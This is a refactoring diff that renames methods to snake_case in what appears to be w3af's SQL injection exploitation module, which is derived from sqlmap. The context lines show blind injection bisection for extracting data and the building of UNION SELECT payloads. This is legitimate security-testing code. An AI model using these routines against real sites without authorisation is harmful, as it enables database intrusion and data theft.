@@ -27,8 +27,8 @@ class args:
     trueResult = None
     exaustiveFp = None
     col = None
-    getBanner = None
-    unionUse = None
+    get_banner = None
+    union_use = None
     string = None
     injParameter = None
     resumedQueries = {}
@@ -66,20 +66,20 @@ class dbDriverFunctions:
             if line:
                 self._autocomplete_strings.append(line)
 
-    def isRunningGoodSamaritan(self):
+    def is_running_good_samaritan(self):
         return self._runningGS
 
-    def startGoodSamaritan(self):
+    def start_good_samaritan(self):
         om.out.debug('\r\nStarting good samaritan module, please help the blind man find his way.')
         self._runningGS = True
 
-    def stopGoodSamaritan(self):
+    def stop_good_samaritan(self):
         if self._runningGS:
             om.out.debug('\r\nStopping good samaritan module.')
             self._tm.join(self)
             self._runningGS = False
 
-    def goodSamaritanContribution(self, contribution):
+    def good_samaritan_contribution(self, contribution):
         '''
         A good samaritan typed something to the console and now I can use it to help the blind process.
         '''
@@ -105,18 +105,18 @@ class dbDriverFunctions:
         """
         om.out.error("[WARN] %s" % message)
 
-    def urlReplace(self, parameter="", value="", newValue=""):
+    def url_replace(self, parameter="", value="", newValue=""):
         mutant = self._vuln.get_mutant()
         mutant.set_mod_value(self._vuln['falseValue'] + newValue)
 
         if mutant.get_dc():
-            baseUrl = mutant.getURL().uri2url(
+            base_url = mutant.get_url().uri2url(
             ) + '?' + urllib.unquote_plus(str(mutant.get_dc()))
         else:
-            baseUrl = mutant.getURL()
-        return baseUrl
+            base_url = mutant.get_url()
+        return base_url
 
-    def getPage(self, url):
+    def get_page(self, url):
         """
         Connect to the target url or proxy and return the target
         url page.
@@ -124,18 +124,18 @@ class dbDriverFunctions:
         m = self._vuln.get_mutant()
         url = URL(url)
         m.set_dc(url.querystring)
-        m.setURL(url.uri2url())
+        m.set_url(url.uri2url())
         response = self._uri_opener.send_mutant(m)
-        if response.getCode() in range(500, 599):
-            raise w3afException('getPage request returned an HTTP error 500.')
-        return response.getBody()
+        if response.get_code() in range(500, 599):
+            raise w3afException('get_page request returned an HTTP error 500.')
+        return response.get_body()
 
-    def queryPage(self, url):
+    def query_page(self, url):
         """
-        Call getPage() function to get the target url page and return
+        Call get_page() function to get the target url page and return
         its page MD5 hash or boolean value in case of string match check.
         """
-        page = self.getPage(url)
+        page = self.get_page(url)
 
         if not self.args.string:
             return page
@@ -144,8 +144,8 @@ class dbDriverFunctions:
         else:
             return False
 
-    def bisectionAlgorithm(self, evilStm, exactEvilStm, expr, logMsg=True):
-        baseUrl = self.urlReplace(newValue=evilStm)
+    def bisection_algorithm(self, evilStm, exactEvilStm, expr, logMsg=True):
+        base_url = self.url_replace(newValue=evilStm)
 
         count = 0
         index = 0
@@ -172,8 +172,8 @@ class dbDriverFunctions:
                         to_test_parsed), 'repla00ce_me_please')
                     exactEvilStm = exactEvilStm.replace(
                         "'repla00ce_me_please'", to_test_escaped)
-                    evilUrl = self.urlReplace(newValue=exactEvilStm)
-                    evilResult = self.queryPage(evilUrl)
+                    evilUrl = self.url_replace(newValue=exactEvilStm)
+                    evilResult = self.query_page(evilUrl)
 
                     if self._cmpFunction(evilResult, self.args.trueResult):
                         value += to_test_parsed
@@ -209,12 +209,12 @@ class dbDriverFunctions:
                 count += 1
                 limit = ((max + min) / 2)
 
-                evilUrl = baseUrl % (expr, index, 1, limit)
+                evilUrl = base_url % (expr, index, 1, limit)
                 try:
-                    evilResult = self.queryPage(evilUrl)
+                    evilResult = self.query_page(evilUrl)
                 except w3afException, w3:
                     try:
-                        evilResult = self.queryPage(evilUrl)
+                        evilResult = self.query_page(evilUrl)
                     except w3afException, w3:
                         return count, value + '__incomplete exploitation__'
 
@@ -235,16 +235,16 @@ class dbDriverFunctions:
                         time.sleep(1.4)
 
                     if self.args.verbose:
-                        self.log('bisectionAlgorithm found new char: "' +
+                        self.log('bisection_algorithm found new char: "' +
                                  val + '" ; ord(val) == ' + str(ord(val)))
-                        self.log('bisectionAlgorithm found value: "' + value +
+                        self.log('bisection_algorithm found value: "' + value +
                                  '" ; len(value) == ' + str(len(value)))
                         if self._runningGS:
                             om.out.console('\r' + ' ' * 40, newLine=False)
                             om.out.console('\rgoodSamaritan(' +
                                            value + ')>>>', newLine=False)
 
-        self.log('bisectionAlgorithm final value: "' + value + '"')
+        self.log('bisection_algorithm final value: "' + value + '"')
 
         #
         #   I'm going to keep track of the results, and if I see one that repeats more than once,
@@ -267,8 +267,8 @@ class dbDriverFunctions:
 
         expr = self.unescape(expression)
 
-        evilStm = self.createStm()
-        exactEvilStm = self.createExactStm()
+        evilStm = self.create_stm()
+        exactEvilStm = self.create_exact_stm()
 
         # This is kept here just for reference. This is from the original sqlmap code.
         '''
@@ -282,12 +282,12 @@ class dbDriverFunctions:
 
                     return value
 
-        if self.args.writeFile:
-            self.args.writeFile.write("%s::%s::" % (self.args.url, expression))
-            self.args.writeFile.flush()
+        if self.args.write_file:
+            self.args.write_file.write("%s::%s::" % (self.args.url, expression))
+            self.args.write_file.flush()
         '''
 
-        count, value = self.bisectionAlgorithm(evilStm, exactEvilStm, expr)
+        count, value = self.bisection_algorithm(evilStm, exactEvilStm, expr)
         duration = int(time.time() - start)
 
         logMsg = "performed %d queries in %d seconds" % (count, duration)
@@ -295,7 +295,7 @@ class dbDriverFunctions:
 
         return value
 
-    def parseFp(self, dbms, fingerprint):
+    def parse_fp(self, dbms, fingerprint):
         fp = dbms
 
         if len(fingerprint) == 0:
@@ -308,7 +308,7 @@ class dbDriverFunctions:
 
             return fp[:-4]
 
-    def unionCheck(self):
+    def union_check(self):
         logMsg = "testing UNION SELECT statement on "
         logMsg += "parameter '%s'" % self.args.injParameter
         self.log(logMsg)
@@ -330,8 +330,8 @@ class dbDriverFunctions:
             elif self.args.injectionMethod == "stringdouble":
                 checkStm = stm + ', "1'
 
-            baseUrl = self.urlReplace(newValue=checkStm)
-            newResult = self.queryPage(baseUrl)
+            base_url = self.url_replace(newValue=checkStm)
+            newResult = self.query_page(base_url)
 
             if not newResult in resultDict.keys():
                 resultDict[newResult] = (1, stm)
@@ -344,18 +344,18 @@ class dbDriverFunctions:
                 for element in resultDict.values():
                     if element[0] == 1:
                         if self.args.httpMethod == "GET":
-                            value = baseUrl
+                            value = base_url
 
                             if not self.args.injectionMethod == "numeric":
-                                value = baseUrl.replace(
+                                value = base_url.replace(
                                     "SELECT NULL,", "SELECT")
 
                             self.args.unionCount = value.count("NULL")
 
                             return value
                         elif self.args.httpMethod == "POST":
-                            url = baseUrl.split("?")[0]
-                            data = baseUrl.split("?")[1]
+                            url = base_url.split("?")[0]
+                            data = base_url.split("?")[1]
                             value = "url:\t'%s'" % url
 
                             if not self.args.injectionMethod == "numeric":
@@ -369,7 +369,7 @@ class dbDriverFunctions:
 
         return None
 
-    def prepareUnionUse(self, expression, exprPosition):
+    def prepare_union_use(self, expression, exprPosition):
         if self.args.injectionMethod == "numeric":
             stm = " UNION SELECT "
         elif self.args.injectionMethod == "stringsingle":
@@ -393,7 +393,7 @@ class dbDriverFunctions:
 
         return stm
 
-    def unionUse(self, expression):
+    def union_use(self, expression):
             count = 0
             start = time.time()
 
@@ -402,7 +402,7 @@ class dbDriverFunctions:
             warnMsg += "expression is wrong"
 
             if not self.args.unionCount:
-                checkUnion = self.unionCheck()
+                checkUnion = self.union_check()
 
                 if checkUnion:
                     index = checkUnion.index("UNION")
@@ -424,9 +424,9 @@ class dbDriverFunctions:
                     # Perform a request using the UNION SELECT statement
                     # to check it the target url is affected by an
                     # inband SQL injection vulnerability
-                    stm = self.prepareUnionUse(randValue, exprPosition)
-                    baseUrl = self.urlReplace(newValue=stm)
-                    resultPage = self.getPage(baseUrl)
+                    stm = self.prepare_union_use(randValue, exprPosition)
+                    base_url = self.url_replace(newValue=stm)
+                    resultPage = self.get_page(base_url)
 
                     count += 1
 
@@ -442,9 +442,9 @@ class dbDriverFunctions:
 
                         # Perform the expression request then parse the
                         # returned page to get the expression output
-                        stm = self.prepareUnionUse(expression, exprPosition)
-                        baseUrl = self.urlReplace(newValue=stm)
-                        resultPage = self.getPage(baseUrl)
+                        stm = self.prepare_union_use(expression, exprPosition)
+                        base_url = self.url_replace(newValue=stm)
+                        resultPage = self.get_page(base_url)
 
                         # TODO: improve this check (works it the web
                         # application is written in PHP, check others)
@@ -460,7 +460,7 @@ class dbDriverFunctions:
                         count += 1
                         duration = int(time.time() - start)
 
-                        logMsg = "request: %s" % baseUrl
+                        logMsg = "request: %s" % base_url
                         self.log(logMsg)
 
                         logMsg = "the target url is affected by an "
